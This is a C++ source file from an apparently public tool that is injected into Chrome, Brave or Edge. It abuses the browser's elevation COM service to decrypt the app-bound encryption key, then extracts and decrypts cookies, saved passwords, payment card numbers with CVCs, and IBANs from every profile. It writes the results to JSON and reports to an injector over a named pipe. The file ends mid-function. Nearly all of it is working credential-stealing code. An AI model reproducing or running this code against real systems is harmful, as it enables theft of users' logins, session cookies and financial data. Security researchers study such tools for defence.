// chrome_decrypt.cpp
// v0.16.1 (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include <Windows.h>
#include <ShlObj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <Wincrypt.h>
#include <Lmcons.h>

#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <memory>
#include <optional>
#include <stdexcept>
#include <filesystem>
#include <functional>
#include <any>
#include <unordered_map>
#include <set>

#include "reflective_loader.h"
#include "sqlite3.h"

#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;

enum class ProtectionLevel
{
    None = 0,
    PathValidationOld = 1,
    PathValidation = 2,
    Max = 3
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("E12B779C-CDB8-4F19-95A0-9CA19B31A8F6")
IEdgeElevatorBase_Placeholder : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2_Unknown(void) = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3_Unknown(void) = 0;
};
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IEdgeIntermediateElevator : public IEdgeElevatorBase_Placeholder
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR *, const WCHAR *, const WCHAR *, const WCHAR *, DWORD, ULONG_PTR *) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR *, DWORD *) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR *, DWORD *) = 0;
};
MIDL_INTERFACE("C9C2B807-7731-4F34-81B7-44FF7779522B")
IEdgeElevatorFinal : public IEdgeIntermediateElevator{};

namespace Payload
{
    class PipeLogger;

    namespace Utils
    {
        fs::path GetLocalAppDataPath()
        {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path)))
            {
                fs::path result = path;
                CoTaskMemFree(path);
                return result;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        std::optional<std::vector<uint8_t>> Base64Decode(const std::string &input)
        {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
                return std::nullopt;
            std::vector<uint8_t> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr))
                return std::nullopt;
            return data;
        }

        std::string BytesToHexString(const std::vector<uint8_t> &bytes)
        {
            std::ostringstream oss;
            oss << std::hex << std::setfill('0');
            for (uint8_t byte : bytes)
                oss << std::setw(2) << static_cast<int>(byte);
            return oss.str();
        }

        std::string EscapeJson(const std::string &s)
        {
            std::ostringstream o;
            for (char c : s)
            {
                switch (c)
                {
                case '"':
                    o << "\\\"";
                    break;
                case '\\':
                    o << "\\\\";
                    break;
                case '\b':
                    o << "\\b";
                    break;
                case '\f':
                    o << "\\f";
                    break;
                case '\n':
                    o << "\\n";
                    break;
                case '\r':
                    o << "\\r";
                    break;
                case '\t':
                    o << "\\t";
                    break;
                default:
                    if ('\x00' <= c && c <= '\x1f')
                    {
                        o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << static_cast<int>(c);
                    }
                    else
                    {
                        o << c;
                    }
                }
            }
            return o.str();
        }
    }

    namespace Browser
    {
        struct Config
        {
            std::string name;
            std::wstring processName;
            CLSID clsid;
            IID iid;
            fs::path userDataSubPath;
        };

        const std::unordered_map<std::string, Config> &GetConfigs()
        {
            static const std::unordered_map<std::string, Config> browser_configs = {
                {"chrome", {"Chrome", L"chrome.exe", {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}}, {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}, fs::path("Google") / "Chrome" / "User Data"}},
                {"brave", {"Brave", L"brave.exe", {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}}, {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}}, fs::path("BraveSoftware") / "Brave-Browser" / "User Data"}},
                {"edge", {"Edge", L"msedge.exe", {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}}, {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}}, fs::path("Microsoft") / "Edge" / "User Data"}}};
            return browser_configs;
        }

        Config GetConfigForCurrentProcess()
        {
            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            std::string processName = fs::path(exePath).filename().string();
            std::transform(processName.begin(), processName.end(), processName.begin(), ::tolower);

            const auto &configs = GetConfigs();
            if (processName == "chrome.exe")
                return configs.at("chrome");
            if (processName == "brave.exe")
                return configs.at("brave");
            if (processName == "msedge.exe")
                return configs.at("edge");

            throw std::runtime_error("Unsupported host process: " + processName);
        }
    }

    namespace Crypto
    {
        constexpr size_t KEY_SIZE = 32;
        constexpr size_t GCM_IV_LENGTH = 12;
        constexpr size_t GCM_TAG_LENGTH = 16;
        const uint8_t KEY_PREFIX[] = {'A', 'P', 'P', 'B'};
        const std::string V20_PREFIX = "v20";

        std::vector<uint8_t> DecryptGcm(const std::vector<uint8_t> &key, const std::vector<uint8_t> &blob)
        {
            const size_t GCM_OVERHEAD_LENGTH = V20_PREFIX.length() + GCM_IV_LENGTH + GCM_TAG_LENGTH;

            if (blob.size() < GCM_OVERHEAD_LENGTH || memcmp(blob.data(), V20_PREFIX.c_str(), V20_PREFIX.length()) != 0)
            {
                return {};
            }

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
            auto algCloser = [](BCRYPT_ALG_HANDLE h)
            { if(h) BCryptCloseAlgorithmProvider(h,0); };
            std::unique_ptr<void, decltype(algCloser)> algGuard(hAlg, algCloser);

            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

            BCRYPT_KEY_HANDLE hKey = nullptr;
            BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
            auto keyCloser = [](BCRYPT_KEY_HANDLE h)
            { if(h) BCryptDestroyKey(h); };
            std::unique_ptr<void, decltype(keyCloser)> keyGuard(hKey, keyCloser);

            const uint8_t *iv = blob.data() + V20_PREFIX.length();
            const uint8_t *ct = iv + GCM_IV_LENGTH;
            const uint8_t *tag = blob.data() + (blob.size() - GCM_TAG_LENGTH);
            ULONG ct_len = static_cast<ULONG>(blob.size() - V20_PREFIX.length() - GCM_IV_LENGTH - GCM_TAG_LENGTH);

            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
            BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
            authInfo.pbNonce = (PUCHAR)iv;
            authInfo.cbNonce = GCM_IV_LENGTH;
            authInfo.pbTag = (PUCHAR)tag;
            authInfo.cbTag = GCM_TAG_LENGTH;

            std::vector<uint8_t> plain(ct_len > 0 ? ct_len : 1);
            ULONG outLen = 0;
            try
            {
                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
                if (!NT_SUCCESS(status))
                {
                    return {};
                }
            }
            catch (...)
            {
                return {};
            }

            plain.resize(outLen);
            return plain;
        }

        std::vector<uint8_t> GetEncryptedMasterKey(const fs::path &localStatePath)
        {
            std::ifstream f(localStatePath, std::ios::binary);
            if (!f)
                throw std::runtime_error("Could not open Local State file.");

            std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
            const std::string tag = "\"app_bound_encrypted_key\":\"";
            size_t pos = content.find(tag);
            if (pos == std::string::npos)
                throw std::runtime_error("app_bound_encrypted_key not found.");

            pos += tag.length();
            size_t end_pos = content.find('"', pos);
            if (end_pos == std::string::npos)
                throw std::runtime_error("Malformed app_bound_encrypted_key.");

            auto optDecoded = Utils::Base64Decode(content.substr(pos, end_pos - pos));
            if (!optDecoded)
                throw std::runtime_error("Base64 decoding of key failed.");

            auto &decodedData = *optDecoded;
            if (decodedData.size() < sizeof(KEY_PREFIX) || memcmp(decodedData.data(), KEY_PREFIX, sizeof(KEY_PREFIX)) != 0)
            {
                throw std::runtime_error("Key prefix validation failed.");
            }
            return {decodedData.begin() + sizeof(KEY_PREFIX), decodedData.end()};
        }
    }

    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        struct ExtractionConfig
        {
            fs::path dbRelativePath;
            std::string outputFileName;
            std::string sqlQuery;
            std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
            std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
        };

        const std::vector<ExtractionConfig> &GetExtractionConfigs()
        {
            static const std::vector<ExtractionConfig> configs = {
                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 6));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
                         if (plain.size() <= COOKIE_PLAINTEXT_HEADER_SIZE)
                         {
                             return std::nullopt;
                         }

                         const char *value_start = reinterpret_cast<const char *>(plain.data()) + COOKIE_PLAINTEXT_HEADER_SIZE;
                         size_t value_size = plain.size() - COOKIE_PLAINTEXT_HEADER_SIZE;

                         std::ostringstream json_entry;
                         json_entry << "  {\"host\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) << "\""
                                    << ",\"name\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) << "\""
                                    << ",\"path\":\"" << Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) << "\""
                                    << ",\"value\":\"" << Utils::EscapeJson({value_start, value_size}) << "\""
                                    << ",\"expires\":" << sqlite3_column_int64(stmt, 5)
                                    << ",\"secure\":" << (sqlite3_column_int(stmt, 3) ? "true" : "false")
                                    << ",\"httpOnly\":" << (sqlite3_column_int(stmt, 4) ? "true" : "false")
                                    << "}";
                         return json_entry.str();
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
                 nullptr,
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
                     if (!blob)
                         return std::nullopt;
                     try
                     {
                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
                         return "  {\"origin\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
                                "\",\"username\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                                "\",\"password\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
                     }
                     catch (...)
                     {
                         return std::nullopt;
                     }
                 }},
                {"Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                         return cvcMap;
                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return cvcMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string card_num_str, cvc_str;
                     try
                     {
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
                         if (blob)
                         {
                             auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
                             card_num_str.assign((char *)plain.data(), plain.size());
                         }
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && cvcMap->count(guid))
                         {
                             auto plain = Crypto::DecryptGcm(key, cvcMap->at(guid));
                             cvc_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                     }
                     return "  {\"name_on_card\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
                            "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
                            ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
                            ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
                            "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
                 }},
                {"Web Data", "iban", "SELECT guid, value_encrypted, nickname FROM local_ibans;",
                 [](sqlite3 *db) -> std::optional<std::any>
                 {
                     auto encryptedMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
                     sqlite3_stmt *stmt = nullptr;
                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_ibans;", -1, &stmt, nullptr) != SQLITE_OK)
                         return encryptedMap;

                     while (sqlite3_step(stmt) == SQLITE_ROW)
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
                         if (guid && blob)
                             (*encryptedMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
                     }
                     sqlite3_finalize(stmt);
                     return encryptedMap;
                 },
                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
                 {
                     const auto &encryptedMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
                     std::string value_str;
                     try
                     {
                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
                         if (guid && encryptedMap->count(guid))
                         {
                             auto plain = Crypto::DecryptGcm(key, encryptedMap->at(guid));
                             value_str.assign((char *)plain.data(), plain.size());
                         }
                     }
                     catch (...)
                     {
                         // handle errors silently
                     }

                     return "{\"nickname\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) +
                            "\",\"value\":\"" + Utils::EscapeJson(value_str) + "\"}";
                 }}};
            return configs;
        }
    }

    class PipeLogger
    {
    public:
        PipeLogger(LPCWSTR pipeName)
        {
            m_pipe = CreateFileW(pipeName, GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }

        ~PipeLogger()
        {
            if (m_pipe != INVALID_HANDLE_VALUE)
            {
                Log("__DLL_PIPE_COMPLETION_SIGNAL__");
                FlushFileBuffers(m_pipe);
                CloseHandle(m_pipe);
            }
        }

        bool isValid() const
        {
            return m_pipe != INVALID_HANDLE_VALUE;
        }

        void Log(const std::string &message)
        {
            if (isValid())
            {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length() + 1), &bytesWritten, nullptr);
            }
        }

        HANDLE getHandle() const
        {
            return m_pipe;
        }

    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
    };

    class BrowserManager
    {
    public:
        BrowserManager() : m_config(Browser::GetConfigForCurrentProcess()) {}

        const Browser::Config &getConfig() const
        {
            return m_config;
        }
        const fs::path getUserDataRoot() const
        {
            return Utils::GetLocalAppDataPath() / m_config.userDataSubPath;
        }

    private:
        Browser::Config m_config;
    };

    class MasterKeyDecryptor
    {
    public:
        MasterKeyDecryptor(PipeLogger &logger) : m_logger(logger)
        {
            if (FAILED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))
            {
                throw std::runtime_error("Failed to initialize COM library.");
            }
            m_comInitialized = true;
            m_logger.Log("[+] COM library initialized (APARTMENTTHREADED).");
        }

        ~MasterKeyDecryptor()
        {
            if (m_comInitialized)
            {
                CoUninitialize();
            }
        }

        std::vector<uint8_t> Decrypt(const Browser::Config &config, const fs::path &localStatePath)
        {
            m_logger.Log("[*] Reading Local State file: " + localStatePath.u8string());

            if (!fs::exists(localStatePath))
            {
                throw std::runtime_error("Local State file not found: " + localStatePath.u8string());
            }

            auto encryptedKeyBlob = Crypto::GetEncryptedMasterKey(localStatePath);

            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char *>(encryptedKeyBlob.data()), (UINT)encryptedKeyBlob.size());
            if (!bstrEncKey)
                throw std::runtime_error("Memory allocation failed for encrypted key");
            auto bstrEncGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(bstrEncKey, &SysFreeString);

            BSTR bstrPlainKey = nullptr;
            auto bstrPlainGuard = std::unique_ptr<OLECHAR[], decltype(&SysFreeString)>(nullptr, &SysFreeString);

            HRESULT hr = E_FAIL;
            DWORD comErr = 0;

            m_logger.Log("[*] Attempting to decrypt master key via " + config.name + "'s COM server...");
            if (config.name == "Edge")
            {
                Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (FAILED(hr))
                {
                    std::ostringstream oss;
                    oss << "Failed to create COM instance for Edge. HRESULT: 0x" << std::hex << hr;
                    throw std::runtime_error(oss.str());
                }

                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                if (FAILED(hr))
                {
                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
                }

                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
            else
            {
                Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
                hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, &elevator);
                if (FAILED(hr))
                {
                    std::ostringstream oss;
                    oss << "Failed to create COM instance for " << config.name << ". HRESULT: 0x" << std::hex << hr;
                    throw std::runtime_error(oss.str());
                }

                hr = CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
                if (FAILED(hr))
                {
                    m_logger.Log("[-] Warning: CoSetProxyBlanket failed, continuing anyway");
                }

                hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            }
            bstrPlainGuard.reset(bstrPlainKey);

            if (FAILED(hr))
            {
                std::ostringstream oss;
                oss << "COM DecryptData failed. HRESULT: 0x" << std::hex << hr << " COM Error: 0x" << comErr;
                throw std::runtime_error(oss.str());
            }

            if (!bstrPlainKey)
            {
                throw std::runtime_error("DecryptData returned null key");
            }

            if (SysStringByteLen(bstrPlainKey) != Crypto::KEY_SIZE)
            {
                std::ostringstream oss;
                oss << "Decrypted key has wrong size: " << SysStringByteLen(bstrPlainKey) << " (expected " << Crypto::KEY_SIZE << ")";
                throw std::runtime_error(oss.str());
            }

            std::vector<uint8_t> aesKey(Crypto::KEY_SIZE);
            memcpy(aesKey.data(), bstrPlainKey, Crypto::KEY_SIZE);
            return aesKey;
        }

    private:
        PipeLogger &m_logger;
        bool m_comInitialized = false;
    };

    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(const fs::path &userDataRoot, PipeLogger &logger) : m_userDataRoot(userDataRoot), m_logger(logger) {}

        std::vector<fs::path> FindProfiles()
        {
            m_logger.Log("[*] Discovering browser profiles in: " + m_userDataRoot.u8string());
            std::set<fs::path> uniqueProfilePaths;

            auto isProfileDirectory = [](const fs::path &path)
            {
                for (const auto &dataCfg : Data::GetExtractionConfigs())
                {
                    if (fs::exists(path / dataCfg.dbRelativePath))
                        return true;
                }
                return false;
            };

            if (isProfileDirectory(m_userDataRoot))
            {
                uniqueProfilePaths.insert(m_userDataRoot);
            }

            try
            {
                for (const auto &entry : fs::directory_iterator(m_userDataRoot))
                {
                    if (entry.is_directory() && isProfileDirectory(entry.path()))
                    {
                        uniqueProfilePaths.insert(entry.path());
                    }
                }
            }
            catch (const fs::filesystem_error &ex)
            {
                m_logger.Log("[-] Filesystem ERROR during profile discovery: " + std::string(ex.what()));
            }

            m_logger.Log("[+] Found " + std::to_string(uniqueProfilePaths.size()) + " profile(s).");
            return std::vector<fs::path>(uniqueProfilePaths.begin(), uniqueProfilePaths.end());
        }

    private:
        fs::path m_userDataRoot;
        PipeLogger &m_logger;
    };

    class DataExtractor
    {
    public:
        DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
                      const fs::path &baseOutputPath, const std::string &browserName)
            : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}

        void Extract()
        {
            fs::path dbPath = m_profilePath / m_config.dbRelativePath;
            if (!fs::exists(dbPath))
                return;

            sqlite3 *db = nullptr;
            std::string uriPath = "file:" + dbPath.string() + "?nolock=1";
            std::replace(uriPath.begin(), uriPath.end(), '\\', '/');

            if (sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to open database " + dbPath.u8string() + ": " + (db ? sqlite3_errmsg(db) : "N/A"));
                if (db)
                    sqlite3_close_v2(db);
                return;
            }
            auto dbCloser = [](sqlite3 *d)
            { if (d) sqlite3_close_v2(d); };
            std::unique_ptr<sqlite3, decltype(dbCloser)> dbGuard(db, dbCloser);

            sqlite3_stmt *stmt = nullptr;
            if (sqlite3_prepare_v2(dbGuard.get(), m_config.sqlQuery.c_str(), -1, &stmt, nullptr) != SQLITE_OK)
                return;
            auto stmtFinalizer = [](sqlite3_stmt *s)
            { if (s) sqlite3_finalize(s); };
            std::unique_ptr<sqlite3_stmt, decltype(stmtFinalizer)> stmtGuard(stmt, stmtFinalizer);

            std::any preQueryState;
            if (m_config.preQuerySetup)
            {
                if (auto state = m_config.preQuerySetup(dbGuard.get()))
                {
                    preQueryState = *state;
                }
            }

            std::vector<std::string> jsonEntries;
            while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
            {
                if (auto jsonEntry = m_config.jsonFormatter(stmtGuard.get(), m_aesKey, preQueryState))
                {
                    jsonEntries.push_back(*jsonEntry);
                }
            }

            if (!jsonEntries.empty())
            {
                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
                std::error_code ec;
                fs::create_directories(outFilePath.parent_path(), ec);
                if (ec)
                {
                    m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
                    return;
                }

                std::ofstream out(outFilePath, std::ios::trunc);
                if (!out)
                    return;

                out << "[\n";
                for (size_t i = 0; i < jsonEntries.size(); ++i)
                {
                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
                }
                out << "\n]\n";

                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
            }
        }

    private:
        fs::path m_profilePath;
        const Data::ExtractionConfig &m_config;
        const std::vector<uint8_t> &m_aesKey;
        PipeLogger &m_logger;
        fs::path m_baseOutputPath;
        std::string m_browserName;
    };

    class DecryptionOrchestrator
    {
    public:
        DecryptionOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
        {
            if (!m_logger.isValid())
            {
                throw std::runtime_error("Failed to connect to named pipe from injector.");
            }
            ReadPipeParameters();
        }

        void Run()
        {
            BrowserManager browserManager;
            const auto &browserConfig = browserManager.getConfig();
            m_logger.Log("[*] Decryption process started for " + browserConfig.name);

            std::vector<uint8_t> aesKey;
            {
                MasterKeyDecryptor keyDecryptor(m_logger);
                fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
                aesKey = keyDecryptor.Decrypt(browserConfig, localStatePath);
            }
            m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));

            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profilePaths = enumerator.FindProfiles();

            int successfulProfiles = 0;
            int failedProfiles = 0;

            for (const auto &profilePath : profilePaths)
            {
                try
                {
                    m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
                    for (const auto &dataConfig : Data::GetExtractionConfigs())
                    {
                        DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
                        extractor.Extract();
                    }
                    successfulProfiles++;
                }
                catch (const std::exception &e)
                {
                    m_logger.Log("[-] Profile " + profilePath.filename().u8string() +
                                 " extraction failed: " + std::string(e.what()) + " (continuing with others)");
                    failedProfiles++;
                    continue;
                }
            }

            m_logger.Log("[*] Extraction complete: " + std::to_string(successfulProfiles) +
                         " successful, " + std::to_string(failedProfiles) + " failed.");

            if (m_extractFingerprint)
            {
                try
                {
                    ExtractBrowserFingerprint(browserManager, browserConfig);
                }
                catch (const std::exception &e)
                {
                    m_logger.Log("[-] Fingerprint extraction failed: " + std::string(e.what()));
                }
            }
        }

        void ExtractBrowserFingerprint(const BrowserManager &browserManager, const Browser::Config &browserConfig)
        {
            m_logger.Log("[*] Extracting browser fingerprint data...");

            std::ostringstream fingerprint;
            fingerprint << "{\n";
            fingerprint << "  \"browser\": \"" + browserConfig.name + "\",\n";

            char exePath[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, exePath, MAX_PATH);

            DWORD handle = 0;
            DWORD versionInfoSize = GetFileVersionInfoSizeA(exePath, &handle);
            if (versionInfoSize > 0)
            {
                std::vector<BYTE> versionData(versionInfoSize);
                if (GetFileVersionInfoA(exePath, 0, versionInfoSize, versionData.data()))
                {
                    VS_FIXEDFILEINFO *fileInfo = nullptr;
                    UINT len = 0;
                    if (VerQueryValueA(versionData.data(), "\\", (LPVOID *)&fileInfo, &len))
                    {
                        fingerprint << "  \"browser_version\": \"" << HIWORD(fileInfo->dwFileVersionMS) << "."
                                    << LOWORD(fileInfo->dwFileVersionMS) << "."
                                    << HIWORD(fileInfo->dwFileVersionLS) << "."
                                    << LOWORD(fileInfo->dwFileVersionLS) << "\",\n";
                    }
                }
            }

            fingerprint << "  \"executable_path\": \"" + Utils::EscapeJson(exePath) + "\",\n";

            fingerprint << "  \"user_data_path\": \"" + Utils::EscapeJson(browserManager.getUserDataRoot().u8string()) + "\",\n";

            fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
            if (fs::exists(localStatePath))
            {
                std::ifstream f(localStatePath);
                if (f)
                {
                    std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());

                    size_t accountPos = content.find("\"account_info\"");
                    fingerprint << "  \"sync_enabled\": " << (accountPos != std::string::npos ? "true" : "false") << ",\n";

                    size_t enterprisePos = content.find("\"enterprise\"");
                    fingerprint << "  \"enterprise_managed\": " << (enterprisePos != std::string::npos ? "true" : "false") << ",\n";

                    std::string channel = "stable";
                    if (content.find("\"beta\"") != std::string::npos)
                        channel = "beta";
                    else if (content.find("\"dev\"") != std::string::npos)
                        channel = "dev";
                    else if (content.find("\"canary\"") != std::string::npos)
                        channel = "canary";
                    fingerprint << "  \"update_channel\": \"" << channel << "\",\n";

                    size_t searchPos = content.find("\"default_search_provider_data\"");
                    if (searchPos != std::string::npos)
                    {
                        std::string searchProvider = "unknown";
                        if (content.find("\"google\"", searchPos) != std::string::npos)
